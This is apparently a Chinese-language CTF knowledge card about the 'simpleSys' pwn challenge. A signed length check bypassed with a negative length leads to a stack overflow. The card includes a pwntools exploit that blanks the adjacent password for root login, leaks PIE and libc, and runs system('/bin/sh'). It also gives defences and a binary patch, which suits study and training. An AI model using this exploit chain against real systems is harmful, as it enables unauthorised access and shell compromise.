---
id: ctf-pwn-signed-length-unsigned-param-amplify-password-blank-ret2libc
title: 有符号长度检查 + 无符号形参放大：负数长度逐字节读溢出栈，写空相邻密码登 root 后 ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: signed-length-check-unsigned-param-amplify-password-blank-ret2libc
aliases:
- simpleSys
- 负数长度绕过
- int 转 unsigned 长度放大
- 有符号无符号比较绕过
- 相邻账号密码溢出置空
- AWDP simpleSys
- jbe 修符号
tags:
- ctf
- pwn
- signedness
- integer-conversion
- stack-overflow
- ret2libc
- pie
- read-loop
- awdp
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V312
  verified_at: '2026-11-08T12:51:18+08:00'
  notes: '已对照原文 content.md 与18张图核对：图15 main 四功能菜单（sign/login/admin/logout）、图16 sub_146A 有 s[91]、v3=sub_1269()、if(v3>80) break、sub_1317(s,v3)、printf("confirm your bio: %s [y/n]")、图17 sub_1317 形参为 unsigned __int64 a2、循环 read(0,&buf,1) 遇 10 返回否则 *(a1+i)=buf、图18 数据段密码 ''dGhpcyBpcyBwYXNzd29yZA==''，均与卡片一致。核对修正：sub_1317 第二形参按反编译为 64 位无符号 unsigned __int64（原写 unsigned int），-1 放大为 0xFFFFFFFFFFFFFFFF；密码置空/相邻变量覆盖原文只给一句与 exp login(root,''a''*36)，卡片已改为按效果归纳、不臆造 0 字节机制。dedup 除自身外 related 为负数长度+debug write 泄露、ret2plt root 服务等，触发条件与泄露/利用路径不同；dup-scan 无涉及本卡 pair。原子性：有符号/无符号长度绕过、溢出覆盖相邻字段与 ret2libc 为同一题的一条完整利用链（认证绕过是同一溢出的效果），不拆分。未验证点：未复跑 exp（原文无成功截图，仅称『正常打 libc』），exp 偏移为本题专用；无版本信息；frontmatter 无 sources/source_url。'
---

## 一句话结论

`admin` 功能用有符号 `int` 判断 `len > 80`，负的 len 能通过检查；但真正读取的 `sub_1317` 形参是 64 位无符号（`unsigned __int64`），`-1` 被放大成 0xFFFFFFFFFFFFFFFF，循环按字节读入 91 字节栈缓冲区直到换行，既溢出到相邻的账号/密码变量（把密码写成空从而以 root 登录），又能覆盖返回地址；随后用 `%s` 泄 PIE、`puts(read@got)` 泄 libc，再 `system("/bin/sh")` 拿到 shell。AWDP 修复时把有符号比较改成无符号（`jle`→`jbe`）即可拦住负数。

## 原理

- **检查与使用不一致**：`sub_146A` 中 `v3 = sub_1269()`（读整数），`if (v3 > 80) break;` 用的是有符号 int 比较，`-1、-2147483648` 等负值都小于 80，直接通过；随后 `sub_1317(s, v3)` 把同一个 v3 传进去。
- **形参无符号化放大长度**：`sub_1317(int64 a1, unsigned __int64 a2)` 的第二个参数是 64 位无符号。调用时 int 的 `-1` 被转换成 `0xFFFFFFFFFFFFFFFF`，循环条件 `a2 <= i` 在 i 达到该值前都不会成立；函数每次 `read(0,&buf,1)` 读一个字节，遇 `\n` 返回，否则 `*(char*)(a1+i)=buf` 顺序写入。因此实际写入长度只受“输入里有没有换行”限制，可以远超 `s[91]`。
- **相邻变量被覆盖**：原文说明“账号密码是挨着的”，且“溢出字节多的话密码是可控的，我们可以让密码直接为空”。即栈上用户名/密码/校验标志布局相邻，超长输入可覆盖相邻的密码/校验字段，使空密码或免校验的 `root` 登录通过，从而进入只有 root 能用的 `admin` 功能；原文与 exp 未给出具体变量名（exp 直接 `login(b'root', b'a'*36)`），此处按效果归纳。
- **两次溢出分工**：第一次（登录/资料路径）负责绕过认证并把密码置空；进入 admin 后再用负数长度触发第二次大溢出。第一次还可利用 `printf("confirm your bio: %s ...")` 对未终止缓冲区按 `%s` 打印，读到栈上的 PIE 返回地址（exp 用 `'A'` 作分隔再 `recv(6)` 取地址），得到 `elf_base`。
- **ret2libc**：第二次溢出覆盖返回地址，ROP 先 `pop rdi; read@got; puts@plt; start` 泄 libc，再回到 start 触发一次，最后 `pop rdi; binsh; system`。
- **AWDP 修复**：作者最初改 80 这个常数仍过不了 check（因为检查逻辑本身是符号问题），最后直接改汇编，把有符号跳转 `jle` 改成无符号 `jbe`，负数在无符号比较下变成大数，从而被 `>80` 拦住。

## 触发条件

- 程序有菜单式功能（sign/login/admin），admin 需要 root 权限；栈上账号/密码/标志相邻。
- 读取长度的函数使用 `unsigned` 形参（或把长度转成 `size_t`），而调用方用有符号比较做上限检查。
- 读取实现是按字节读到换行（或按长度读到缓冲区），没有把长度截断到 `sizeof(buf)`。
- 二进制开了 PIE/NX，但存在可泄露的 `%s` 或 GOT 输出；提供 libc 或可通过泄漏匹配版本。

## 利用步骤

1. 逆 `main` 菜单，定位 sign/login/admin 三个功能与 `sub_146A` 的长度读取、`sub_1317` 的逐字节写循环。
2. 确认栈布局：`s[91]` 之后是哪些变量（账号、密码、登录标志），以及返回地址偏移。
3. 先用超长输入把相邻密码字段写空（或覆盖 root 标志），以 `root` + 空密码登录；原文 exp 直接 `login(b'root', b'a'*36)` 完成这一步。
4. 进入 admin，发送长度 `-1`；构造 `0x60+8` 字节填充 + ROP。第一次 ROP 泄 PIE：利用 `%s` 打印到返回地址处的字节，按 `'A'` 分隔取 6 字节，算出 `elf_base`。
5. 第二次 ROP：`pop rdi; read@got; puts@plt; start`，从输出解析 libc 的 `read` 地址，算出 `system` 与 `/bin/sh`。
6. 第三次 ROP：`pop rdi; binsh; system`，拿 shell 后读 flag。
7. 若登录仍失败：检查密码字段是否真被写空、是否有 canary/栈对齐问题；若 `%s` 泄不出地址，改用其它输出点或格式化字符串。

## PoC

原文 exp 的关键片段（pwntools）：

```python
def login(name, passwd):
    p.recvuntil(b'choice'); p.sendline(b'2')
    p.recvuntil(b'username'); p.sendline(name)
    p.recvuntil(b'password'); p.send(passwd)      # 注意不是 sendline：靠长度/溢出

def admin():
    p.recvuntil(b'choice'); p.sendline(b'3')

def send(context, flag=b'n', length=b'-1'):
    p.recvuntil(b'length'); p.sendline(length)    # -1 -> unsigned 0xffffffff
    sleep(0.2); p.sendline(context)               # 逐字节读到 \n，溢出 s[91]
    p.recvuntil(b'A')
    add = u64(p.recv(6).ljust(8, b'\x00'))        # %s 泄漏的 PIE 地址
    p.recvuntil(b'[y/n]'); p.sendline(flag)
    return add

# 1) 溢出让相邻密码为空，root 登录
login(b'root', b'a'*36)
admin()

# 2) 第一次溢出：泄 PIE
elf_addr = send(b'a'*(0x60+0x7) + b'A')
elf_base = elf_addr - 0x187D

# 3) 第二次溢出：泄 libc
rdi_ret  = elf_base + 0x1751
read_got = elf.got['read'] + elf_base
puts_plt = elf.plt['puts'] + elf_base
start    = elf_base + 0x1180
pl = b'A'*(0x60+0x8) + p64(rdi_ret) + p64(read_got) + p64(puts_plt) + p64(start)
send(pl, b'y')

leak_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libcbase = leak_addr - libc.symbols['read']
system = libcbase + libc.symbols['system']
binsh  = libcbase + next(libc.search(b'/bin/sh\x00'))

# 4) 第三次溢出：ret2libc
admin()
pl = b'A'*(0x60+0x8) + p64(ret_gadget) + p64(rdi_ret) + p64(binsh) + p64(system)
send(pl, b'y')
```

原文 exp 中的 `0x187D、0x1751、0x1180` 是本题二进制的固定偏移，复现其它题必须重新计算；`login` 用 `send` 而非 `sendline`、admin 的 `send` 用 `sendline` 是关键交互细节。

## 变体与关联

- **其它负数**：`-1`、`-2147483648`、`0x80000000`（若按 int 解释为负数）都可让有符号检查通过、无符号形参放大；具体取决于比较指令是 `jle/jg` 还是 `jb/ja`。
- **不同宽度**：`int16/int32/int64` 与 `unsigned` 的转换点不同，见 [[ctf-pwn-int16-length-sign-bypass-sprintf-format-canary-orw]]；`abs(INT_MIN)` 类取模绕过见 [[binary-pwn-stack-abs-intmin-negative-remainder-stack-overflow]]。
- **没有换行终止**：若读取不遇换行就按长度继续，负长度会直接读满 4G 失败；可改用更大的正数或利用 `read` 返回值截断。
- **AWDP 修复**：与其改 80 常数，不如把 `jle` 改 `jbe`（无符号比较），或在源码中先判 `len < 0 || len > sizeof(buf)` 再调用读取函数；同类二进制补丁思路见 [[ctf-pwn-awdp-stack-overflow-length-compare-binary-patch]]。
- **认证绕过部分**：本题依赖栈上账号/密码相邻的特定布局；换题时需重新确认要覆盖的变量，不能照搬偏移。

## 检测与防御

- **长度检查必须与使用同型**：检查通过后立刻把长度限制到 `sizeof(buf)`，并用 `size_t`/无符号统一类型；拒绝负数，或在转换前判 `len < 0`。
- **读取要带硬上限**：`read(fd, buf, min(len, sizeof(buf)))`；逐字节循环加上缓冲区边界判断，不能只靠输入里的换行停止。
- **认证状态隔离**：账号、密码、权限标志不要放在可被同一缓冲区溢出覆盖的相邻栈变量；使用 canary、PIE、栈保护，并避免把密码明文/可写字段放在同一栈帧。
- **AWDP/补丁**：把有符号比较改为无符号（`jle`→`jbe`）能拦住负数，但更稳妥的是同时在读取函数内加上限；修复后回归测试正常长度、负数和超长输入。
- **合规**：仅用于 CTF/授权题目环境；不要对真实登录系统尝试同类溢出。
